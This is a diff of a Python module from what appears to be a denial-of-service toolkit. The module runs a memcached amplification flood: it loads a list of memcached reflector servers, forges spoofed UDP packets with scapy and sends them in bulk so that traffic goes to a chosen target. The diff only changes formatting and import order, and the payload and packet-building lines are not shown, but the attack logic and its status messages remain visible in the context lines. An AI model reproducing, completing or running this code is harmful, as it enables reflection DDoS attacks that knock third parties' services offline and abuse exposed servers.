@@ -1,10 +1,11 @@
 # Import modules
 import random
-from scapy.all import IP, UDP, send, Raw
+
 from colorama import Fore
+from scapy.all import IP, UDP, Raw, send
 
 # Load MEMCACHED servers list
-with open("tools/L4/memcached_servers.txt", "r") as f:
+with open("tools/L4/memcached_servers.txt") as f:
     memcached_servers = f.readlines()
 
 # Payload
@@ -25,9 +26,9 @@ def flood(target):
         send(packet, count=packets, verbose=False)
     except Exception as e:
         print(
-            f"{Fore.MAGENTA}Error while sending forged UDP packet\n{Fore.MAGENTA}{e}{Fore.RESET}"
+            f"{Fore.MAGENTA}Error while sending forged UDP packet\n{Fore.MAGENTA}{e}{Fore.RESET}",
         )
     else:
         print(
-            f"{Fore.GREEN}[+] {Fore.YELLOW}Sending {packets} forged UDP packets from memcached server {server} to {'{}:{}'.format(*target)}.{Fore.RESET}"
+            f"{Fore.GREEN}[+] {Fore.YELLOW}Sending {packets} forged UDP packets from memcached server {server} to {'{}:{}'.format(*target)}.{Fore.RESET}",
         )
